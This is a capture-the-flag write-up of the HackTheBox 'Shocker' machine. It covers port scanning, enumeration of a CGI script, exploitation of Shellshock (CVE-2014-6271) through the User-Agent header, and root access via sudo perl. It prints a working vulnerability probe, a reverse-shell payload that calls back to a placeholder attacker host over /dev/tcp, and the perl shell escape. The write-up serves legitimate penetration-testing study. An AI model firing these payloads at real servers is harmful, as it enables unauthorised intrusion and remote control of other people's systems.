# HTB — Shocker

**Difficulty:** Easy
**OS:** Linux (Ubuntu)
**Target Service:** Apache httpd 2.4.18 / CGI
**CVE:** CVE-2014-6271 (Shellshock)
**Key Concepts:** Shellshock via HTTP header injection, sudo perl GTFOBins

---

## Phase Recon

Full port scan with service and OS detection:

```bash
nmap -sS -sV -O -p- 10.xx.xx.xx
```

Two open ports:

| Port | Service |
|------|---------|
| 80 | Apache httpd 2.4.18 (Ubuntu) |
| 2222 | OpenSSH 7.2p2 (non-standard port) |

SSH running on port 2222 instead of 22 is worth noting — non-standard ports are common in hardened environments and easy to miss without a full `-p-` scan.

Pulled HTTP headers and page content:

```bash
curl -I http://10.xx.xx.xx && curl -L http://10.xx.xx.xx
```

The page returned a simple "Don't Bug Me!" message with a bug image — the box name "Shocker" and the bug imagery are both hints pointing toward **Shellshock (CVE-2014-6271)**.

---

## Phase Enumeration

Ran directory enumeration with shell script extensions added — relevant because Shellshock targets CGI scripts:

```bash
gobuster dir -u http://10.xx.xx.xx -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,sh
```

Key finding:

```
/cgi-bin/    (Status: 403)
```

The `/cgi-bin/` directory exists but returns 403. Ran a second enumeration pass specifically against it with CGI-relevant extensions:

```bash
gobuster dir -u http://10.xx.xx.xx/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,pl,cgi,py
```

Found:

```
/cgi-bin/user.sh    (Status: 200)
```

Confirmed the script was live and executing:

```bash
curl http://10.xx.xx.xx/cgi-bin/user.sh
# Content-Type: text/plain
# Just an uptime test script
# 13:41:12 up 1:58, 0 users, load average: 0.00, 0.00, 0.00
```

The script returns live uptime output, confirming it executes bash on the server — a prerequisite for Shellshock.

---

## Phase Exploit — Shellshock (CVE-2014-6271)

Shellshock exploits a vulnerability in bash where environment variables containing function definitions also execute commands appended after the definition. Apache CGI passes HTTP headers as environment variables, making the `User-Agent` header a direct injection point.

Tested for vulnerability:

```bash
curl -H "User-Agent: () { :;}; echo; echo vulnerable" http://10.xx.xx.xx/cgi-bin/user.sh
```

Output confirmed:

```
vulnerable
Content-Type: text/plain
...
```

Set up a listener on Kali:

```bash
nc -lvnp 4444
```

Fired the reverse shell payload via the User-Agent header:

```bash
curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1" http://10.xx.xx.xx/cgi-bin/user.sh
```

Note: the full path `/bin/bash` was required — `bash` alone failed because the CGI environment does not inherit the standard PATH.

Listener caught the connection as `shelly`:

```
shelly@Shocker:/usr/lib/cgi-bin$
```

Retrieved the user flag from `/home/shelly/user.txt`. Flag redacted.

---

## Phase Privilege Escalation — sudo perl (GTFOBins)

First post-exploitation check:

```bash
sudo -l
```

Output:

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

`shelly` can run perl as root with no password. Perl can execute system commands directly, making this an immediate root path via GTFOBins:

```bash
sudo /usr/bin/perl -e 'exec "/bin/bash";'
```

Shell spawned as root instantly:

```
root@Shocker:/usr/lib/cgi-bin#
```

Retrieved root flag from `/root/root.txt`. Flag redacted.

---

## Key Takeaways

- Always scan all ports with `-p-` — SSH on port 2222 would be missed by a default scan and could be useful for credential-based access later
- The `/cgi-bin/` directory returning 403 is not a dead end — enumerate inside it with CGI-relevant extensions (`.sh`, `.pl`, `.cgi`, `.py`)
- Shellshock requires only a CGI script that executes bash — the script's actual function is irrelevant; the vulnerability is in how Apache passes headers to the bash environment
- Always use the full binary path (`/bin/bash`) in CGI-injected payloads — the CGI environment strips PATH, so bare command names fail
- `sudo -l` remains the first and most reliable privesc check on Linux — a single NOPASSWD binary entry on GTFOBins means instant root
- perl, python, vim, nmap, and many other common binaries can all be abused for shell escapes when run with sudo — check GTFOBins (gtfobins.github.io) for the exact syntax
